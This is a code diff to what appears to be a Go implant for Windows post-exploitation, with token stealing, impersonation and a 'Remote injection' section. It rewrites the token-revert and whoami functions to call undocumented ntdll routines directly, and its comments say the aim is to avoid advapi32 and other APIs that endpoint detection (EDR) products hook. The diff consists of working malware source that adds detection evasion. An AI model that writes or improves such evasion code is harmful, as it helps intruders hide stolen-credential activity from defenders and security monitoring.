@@ -34,6 +34,8 @@ var (
 	procImpersonateLoggedOnUser  = windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser")
 	procLogonUserW               = windows.NewLazySystemDLL("advapi32.dll").NewProc("LogonUserW")
 	procRevertToSelf2            = windows.NewLazySystemDLL("advapi32.dll").NewProc("RevertToSelf")
+	procNtSetInformationThread   = windows.NewLazySystemDLL("ntdll.dll").NewProc("NtSetInformationThread")
+	procNtQueryInformationToken  = windows.NewLazySystemDLL("ntdll.dll").NewProc("NtQueryInformationToken")
 	procGetDesktopWindow         = windows.NewLazySystemDLL("user32.dll").NewProc("GetDesktopWindow")
 	procGetDC                    = windows.NewLazySystemDLL("user32.dll").NewProc("GetDC")
 	procReleaseDC                = windows.NewLazySystemDLL("user32.dll").NewProc("ReleaseDC")
@@ -676,18 +678,57 @@ func dropToken() (string, error) {
 		windows.CloseHandle(windows.Handle(stolenToken))
 		stolenToken = 0
 	}
-	r, _, e := procRevertToSelf2.Call()
-	if r == 0 {
-		return "", fmt.Errorf("RevertToSelf: %w", e)
+	// NtSetInformationThread(ThreadImpersonationToken=5, NULL) — avoids advapi32 hook
+	var hNull uintptr
+	r, _, _ := procNtSetInformationThread.Call(
+		uintptr(windows.CurrentThread()), 5, // ThreadImpersonationToken
+		uintptr(unsafe.Pointer(&hNull)), unsafe.Sizeof(hNull))
+	if r != 0 {
+		// NT failed (unlikely) — fall back to Win32
+		procRevertToSelf2.Call()
 	}
 	return "reverted to original token", nil
 }
 
 func tokenWhoami() string {
-	// GetUserNameExW reads the effective identity of the calling thread: if the
-	// thread is impersonating (via ImpersonateLoggedOnUser / SetThreadToken) it
-	// returns the impersonated user; otherwise it returns the process user.
-	// This is correct for both steal-token and make-token results.
+	// NT path: OpenThreadToken → NtQueryInformationToken → LookupAccountSidW
+	// Avoids GetUserNameA/W/Ex which are commonly hooked by EDRs.
+	var hTok windows.Token
+	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hTok)
+	if err != nil {
+		_ = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &hTok)
+	}
+	if hTok != 0 {
+		defer hTok.Close()
+		var needed uint32
+		procNtQueryInformationToken.Call(uintptr(hTok), 1, // TokenUser
+			0, 0, uintptr(unsafe.Pointer(&needed)))
+		if needed > 0 {
+			buf := make([]byte, needed)
+			r, _, _ := procNtQueryInformationToken.Call(uintptr(hTok), 1,
+				uintptr(unsafe.Pointer(&buf[0])), uintptr(needed),
+				uintptr(unsafe.Pointer(&needed)))
+			if r == 0 {
+				// TOKEN_USER: first field is SID_AND_ATTRIBUTES { PSID Sid; DWORD Attrs }
+				sid := *(*uintptr)(unsafe.Pointer(&buf[0]))
+				var nameLen, domLen, sidType uint32
+				procLookupAccountSidW.Call(0, sid,
+					0, uintptr(unsafe.Pointer(&nameLen)),
+					0, uintptr(unsafe.Pointer(&domLen)),
+					uintptr(unsafe.Pointer(&sidType)))
+				if nameLen > 0 {
+					nameW := make([]uint16, nameLen)
+					domW := make([]uint16, domLen)
+					procLookupAccountSidW.Call(0, sid,
+						uintptr(unsafe.Pointer(&nameW[0])), uintptr(unsafe.Pointer(&nameLen)),
+						uintptr(unsafe.Pointer(&domW[0])), uintptr(unsafe.Pointer(&domLen)),
+						uintptr(unsafe.Pointer(&sidType)))
+					return windows.UTF16ToString(domW) + `\` + windows.UTF16ToString(nameW)
+				}
+			}
+		}
+	}
+	// Fallback: GetUserNameExW
 	const NameSamCompatible = 2
 	var buf [256]uint16
 	var sz uint32 = 256
@@ -696,30 +737,7 @@ func tokenWhoami() string {
 	if r != 0 {
 		return windows.UTF16ToString(buf[:sz])
 	}
-	// Fallback: query the process token directly.
-	var tok windows.Token
-	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
-		return "error: " + err.Error()
-	}
-	defer tok.Close()
-	u, err := tok.GetTokenUser()
-	if err != nil {
-		return "error getting token user: " + err.Error()
-	}
-	var nameLen, domainLen uint32
-	var sidType uint32
-	// Get sizes
-	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
-		0, uintptr(unsafe.Pointer(&nameLen)),
-		0, uintptr(unsafe.Pointer(&domainLen)),
-		uintptr(unsafe.Pointer(&sidType)))
-	nameW := make([]uint16, nameLen)
-	domainW := make([]uint16, domainLen)
-	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
-		uintptr(unsafe.Pointer(&nameW[0])), uintptr(unsafe.Pointer(&nameLen)),
-		uintptr(unsafe.Pointer(&domainW[0])), uintptr(unsafe.Pointer(&domainLen)),
-		uintptr(unsafe.Pointer(&sidType)))
-	return windows.UTF16ToString(domainW) + `\` + windows.UTF16ToString(nameW)
+	return "unknown"
 }
 
 // ── Remote injection ──────────────────────────────────────────────────────────
